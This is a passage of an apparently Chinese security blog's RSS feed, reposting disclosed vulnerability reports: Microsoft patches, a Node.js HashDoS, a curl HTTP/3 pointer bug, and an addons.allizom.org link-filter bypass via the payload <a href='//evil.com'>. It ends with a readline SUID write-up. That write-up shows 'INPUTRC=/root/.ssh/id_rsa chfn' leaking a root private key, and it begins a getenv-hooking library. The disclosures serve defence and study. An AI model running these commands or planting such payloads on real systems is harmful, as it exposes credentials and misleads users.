&lt;li&gt;&lt;strong&gt;CVE-2025-49695&lt;/strong&gt;：Office RCE（连续第三个月出现关键级Office漏洞）&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;其他重要修复&#34;&gt;其他重要修复
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;RRAS服务&lt;/strong&gt;：14个远程代码执行漏洞&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;BitLocker&lt;/strong&gt;：5个安全功能绕过漏洞&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Hyper-V&lt;/strong&gt;：本地代码执行漏洞&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Azure Monitor Agent&lt;/strong&gt;：相邻网络RCE&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;完整CVE列表参见原文表格。&lt;/p&gt;
&lt;h2 id=&#34;后续行动建议&#34;&gt;后续行动建议
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;优先修复SPNEGO、SQL Server等关键漏洞&lt;/li&gt;
&lt;li&gt;Office用户考虑禁用预览窗格&lt;/li&gt;
&lt;li&gt;SQL Server管理员需手动更新OLE DB驱动&lt;/li&gt;
&lt;li&gt;关注8月12日的下一次补丁星期二更新&lt;/li&gt;
&lt;/ol&gt;
&lt;blockquote&gt;
&lt;p&gt;注意：部分漏洞修复需要额外管理操作，请仔细阅读各公告详情。&lt;/p&gt;&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>V8引擎中的HashDoS漏洞分析 - Node.js v24.0.0安全风险警示</title>
        <link>http://localhost:1313/p/v8%E5%BC%95%E6%93%8E%E4%B8%AD%E7%9A%84hashdos%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-node.js-v24.0.0%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9%E8%AD%A6%E7%A4%BA/</link>
        <pubDate>Sun, 03 Aug 2025 09:45:12 +0800</pubDate>
        
        <guid>http://localhost:1313/p/v8%E5%BC%95%E6%93%8E%E4%B8%AD%E7%9A%84hashdos%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-node.js-v24.0.0%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9%E8%AD%A6%E7%A4%BA/</guid>
        <description>&lt;h1 id=&#34;nodejs--报告-3131758---v8引擎中的hashdos漏洞--hackerone&#34;&gt;Node.js | 报告 #3131758 - V8引擎中的HashDoS漏洞 | HackerOne
&lt;/h1&gt;&lt;h2 id=&#34;漏洞概要&#34;&gt;漏洞概要
&lt;/h2&gt;&lt;p&gt;Node.js v24.0.0使用的V8引擎版本修改了通过rapidhash计算字符串哈希的方式。该实现重新引入了HashDoS漏洞——攻击者通过控制待哈希字符串可制造大量哈希碰撞，甚至无需知晓hash-seed即可实现碰撞攻击。&lt;/p&gt;
&lt;p&gt;此漏洞影响所有Node.js v24.x版本用户。&lt;/p&gt;
&lt;h2 id=&#34;时间线&#34;&gt;时间线
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;2025年5月6日&lt;/strong&gt; sharp_edged 向Node.js提交漏洞报告&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;2025年5月7日&lt;/strong&gt; Node.js团队成员mcollina确认漏洞&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;2025年5月9日&lt;/strong&gt; 漏洞状态变更为&amp;quot;Triaged&amp;quot;（已分类）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;2025年6月12日&lt;/strong&gt; 安全研究员snek加入调查&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;2025年7月8日&lt;/strong&gt; 漏洞获得CVE编号CVE-2025-27209&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;2025年7月15日&lt;/strong&gt; 漏洞状态变更为&amp;quot;Resolved&amp;quot;（已修复）并公开披露&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;关键信息&#34;&gt;关键信息
&lt;/h2&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;字段&lt;/th&gt;
          &lt;th&gt;详情&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;报告ID&lt;/td&gt;
          &lt;td&gt;#3131758&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;严重程度&lt;/td&gt;
          &lt;td&gt;高危 (7.5)&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;漏洞类型&lt;/td&gt;
          &lt;td&gt;加密问题 - 通用型&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;影响版本&lt;/td&gt;
          &lt;td&gt;Node.js v24.x全系列&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;赏金金额&lt;/td&gt;
          &lt;td&gt;无&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
</description>
        </item>
        <item>
        <title>OpenSSL HTTP/3漏洞分析：CURLINFO_TLS_SSL_PTR指针错误导致的潜在RCE风险</title>
        <link>http://localhost:1313/p/openssl-http/3%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90curlinfo_tls_ssl_ptr%E6%8C%87%E9%92%88%E9%94%99%E8%AF%AF%E5%AF%BC%E8%87%B4%E7%9A%84%E6%BD%9C%E5%9C%A8rce%E9%A3%8E%E9%99%A9/</link>
        <pubDate>Sun, 03 Aug 2025 09:39:47 +0800</pubDate>
        
        <guid>http://localhost:1313/p/openssl-http/3%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90curlinfo_tls_ssl_ptr%E6%8C%87%E9%92%88%E9%94%99%E8%AF%AF%E5%AF%BC%E8%87%B4%E7%9A%84%E6%BD%9C%E5%9C%A8rce%E9%A3%8E%E9%99%A9/</guid>
        <description>&lt;h1 id=&#34;openssl-http3漏洞分析&#34;&gt;OpenSSL HTTP/3漏洞分析
&lt;/h1&gt;&lt;h2 id=&#34;漏洞概述&#34;&gt;漏洞概述
&lt;/h2&gt;&lt;p&gt;&lt;code&gt;curl_easy_getinfo&lt;/code&gt;的&lt;code&gt;CURLINFO_TLS_SSL_PTR&lt;/code&gt;在OpenSSL HTTP/3连接中返回了无效的SSL连接指针。使用此SSL连接会导致崩溃，并可能产生其他影响。&lt;/p&gt;
&lt;h2 id=&#34;受影响版本&#34;&gt;受影响版本
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;8.15.0 (release)&lt;/li&gt;
&lt;li&gt;8.15.1-DEV (7c23e88d17e0939b4e01c8d05f430e167e148f4b)&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;复现步骤&#34;&gt;复现步骤
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;使用OpenSSL 3.5.1编译libcurl，并配置足够新的nghttp2、nghttp3和ngtcp2&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;--with-openssl --with-nghttp2 --with-ngtcp2 --with-nghttp3
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;使用地址消毒剂编译PoC应用：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;curl/curl.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;openssl/ssl.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;size_t&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;header_callback&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;buffer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;size_t&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;size&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                              &lt;span class=&#34;kt&#34;&gt;size_t&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;nitems&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;userdata&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;c1&#34;&gt;// 回调函数实现
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;c1&#34;&gt;// 主函数实现
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;漏洞影响&#34;&gt;漏洞影响
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;最低影响&lt;/strong&gt;：访问HTTP/3站点时导致拒绝服务&lt;br&gt;
&lt;strong&gt;潜在影响&lt;/strong&gt;：如果返回的指针指向已释放的内存，可能导致内存损坏。根据目标平台不同，可能实现远程代码执行。&lt;/p&gt;
&lt;h2 id=&#34;技术分析&#34;&gt;技术分析
&lt;/h2&gt;&lt;p&gt;漏洞源于将OpenSSL不透明指针错误地指向了另一个OpenSSL对象。这个错误是在libcurl 8.15.0中引入的，仅影响HTTP/3连接。&lt;/p&gt;
&lt;p&gt;攻击者需要满足以下条件才能利用此漏洞：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;应用程序使用此回调&lt;/li&gt;
&lt;li&gt;加载与应用程序共享堆的恶意代码&lt;/li&gt;
&lt;li&gt;能够以特定方式操作堆&lt;/li&gt;
&lt;li&gt;触发应用程序执行HTTP/3请求并在堆设置完全符合预期时触发此回调&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;修复方案&#34;&gt;修复方案
&lt;/h2&gt;&lt;p&gt;GitHub上已提交修复PR：&lt;a class=&#34;link&#34; href=&#34;https://github.com/curl/curl/pull/18066&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;curl/curl#18066&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;时间线&#34;&gt;时间线
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;2025-07-20 漏洞报告提交&lt;/li&gt;
&lt;li&gt;2025-07-28 漏洞公开披露&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>利用协议相对URL(//)绕过个人简介&#34;禁止链接&#34;限制的技术分析</title>
        <link>http://localhost:1313/p/%E5%88%A9%E7%94%A8%E5%8D%8F%E8%AE%AE%E7%9B%B8%E5%AF%B9url/%E7%BB%95%E8%BF%87%E4%B8%AA%E4%BA%BA%E7%AE%80%E4%BB%8B%E7%A6%81%E6%AD%A2%E9%93%BE%E6%8E%A5%E9%99%90%E5%88%B6%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/</link>
        <pubDate>Sun, 03 Aug 2025 09:28:54 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%88%A9%E7%94%A8%E5%8D%8F%E8%AE%AE%E7%9B%B8%E5%AF%B9url/%E7%BB%95%E8%BF%87%E4%B8%AA%E4%BA%BA%E7%AE%80%E4%BB%8B%E7%A6%81%E6%AD%A2%E9%93%BE%E6%8E%A5%E9%99%90%E5%88%B6%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/</guid>
        <description>&lt;h1 id=&#34;绕过禁止链接限制的技术分析报告&#34;&gt;绕过&amp;quot;禁止链接&amp;quot;限制的技术分析报告
&lt;/h1&gt;&lt;h2 id=&#34;漏洞概述&#34;&gt;漏洞概述
&lt;/h2&gt;&lt;p&gt;在addons.allizom.org平台的个人简介编辑功能中，虽然系统明确声明&amp;quot;Links are forbidden&amp;quot;（禁止链接），但攻击者可以通过协议相对URL语法&lt;code&gt;&amp;lt;a href=&amp;quot;//evil.com&amp;quot;&amp;gt;click&amp;lt;/a&amp;gt;&lt;/code&gt;成功植入可点击的超链接。这违反了应用声明的安全策略，可能被用于钓鱼攻击、恶意软件传播等场景。&lt;/p&gt;
&lt;h2 id=&#34;技术细节&#34;&gt;技术细节
&lt;/h2&gt;&lt;h3 id=&#34;漏洞复现步骤&#34;&gt;漏洞复现步骤
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;登录 &lt;a class=&#34;link&#34; href=&#34;https://addons.allizom.org&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://addons.allizom.org&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;进入个人资料编辑页面&lt;/li&gt;
&lt;li&gt;在个人简介字段插入Payload：&lt;code&gt;&amp;lt;a href=&amp;quot;//evil.com&amp;quot;&amp;gt;click&amp;lt;/a&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;保存后，点击生成的&amp;quot;click&amp;quot;链接将跳转到http://evil.com/&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;限制绕过原理&#34;&gt;限制绕过原理
&lt;/h3&gt;&lt;p&gt;系统未正确过滤协议相对URL（以双斜杠&amp;quot;//&amp;ldquo;开头的URL），这种URL会继承当前页面的协议（HTTP/HTTPS）。相比完整URL，协议相对URL能绕过简单的链接检测机制。&lt;/p&gt;
&lt;h2 id=&#34;影响评估&#34;&gt;影响评估
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;违反应用声明的安全策略，破坏用户信任&lt;/li&gt;
&lt;li&gt;攻击者可嵌入：
&lt;ul&gt;
&lt;li&gt;钓鱼网站链接&lt;/li&gt;
&lt;li&gt;恶意软件下载地址&lt;/li&gt;
&lt;li&gt;社会工程攻击载体&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;官方回应&#34;&gt;官方回应
&lt;/h2&gt;&lt;p&gt;Mozilla安全团队确认：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;该限制主要为防垃圾信息而非安全控制&lt;/li&gt;
&lt;li&gt;漏洞评级为&amp;quot;低危&amp;rdquo;&lt;/li&gt;
&lt;li&gt;根本原因是&amp;quot;Improper Input Validation&amp;quot;（输入验证不充分）&lt;/li&gt;
&lt;li&gt;已向报告者发放漏洞奖金&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;时间线&#34;&gt;时间线
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;2025-06-03 漏洞提交&lt;/li&gt;
&lt;li&gt;2025-06-13 确认为有效漏洞并修复&lt;/li&gt;
&lt;li&gt;2025-07-29 公开披露&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>利用SUID逻辑漏洞：Readline信息泄露攻击解析</title>
        <link>http://localhost:1313/p/%E5%88%A9%E7%94%A8suid%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9Ereadline%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/</link>
        <pubDate>Sun, 03 Aug 2025 09:23:22 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%88%A9%E7%94%A8suid%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9Ereadline%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/</guid>
        <description>&lt;h1 id=&#34;利用suid逻辑漏洞readline信息泄露攻击&#34;&gt;利用SUID逻辑漏洞：Readline信息泄露攻击
&lt;/h1&gt;&lt;p&gt;我在readline依赖库中发现了一个逻辑漏洞，当解析INPUTRC环境变量指定的文件时，会部分泄露文件信息。在满足以下条件时，攻击者可能利用该漏洞进行横向移动：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;sshd服务正在运行&lt;/li&gt;
&lt;li&gt;特定用户可登录&lt;/li&gt;
&lt;li&gt;用户私钥存储在已知路径（如/home/user/.ssh/id_rsa）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;该漏洞已于2022年2月报告并修复。由于chfn通常不由util-linux提供，您的系统可能不受影响。我撰写本文的原因是这种利用方式很有趣——它之所以可行，是因为readline配置文件解析函数与SSH密钥格式的巧妙巧合。&lt;/p&gt;
&lt;h2 id=&#34;tldr漏洞演示&#34;&gt;TL;DR漏洞演示
&lt;/h2&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ INPUTRC=/root/.ssh/id_rsa chfn
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Changing finger information for user.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Password:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;readline: /root/.ssh/id_rsa: line 1: -----BEGIN: unknown key modifier
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;readline: /root/.ssh/id_rsa: line 2: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn: no key sequence terminator
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[...]
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;readline: /root/.ssh/id_rsa: line 37: avxwhoky6ozXEAAAAJcm9vdEBNQVRFAQI=: no key sequence terminator
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;readline: /root/.ssh/id_rsa: line 38: -----END: unknown key modifier
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Office [b]: ^C
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;漏洞发现过程&#34;&gt;漏洞发现过程
&lt;/h2&gt;&lt;p&gt;受到Qualys sudo漏洞启发，我最近对SUID漏洞产生了兴趣。在研究《软件安全评估艺术》时，我开始关注环境变量作为攻击面。通过注入拦截库记录getenv调用：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#define _GNU_SOURCE
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;dlfcn.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;syslog.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// gcc getenv.c -fPIC -shared -ldl -o getenv.so
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;_real_getenv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;getenv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
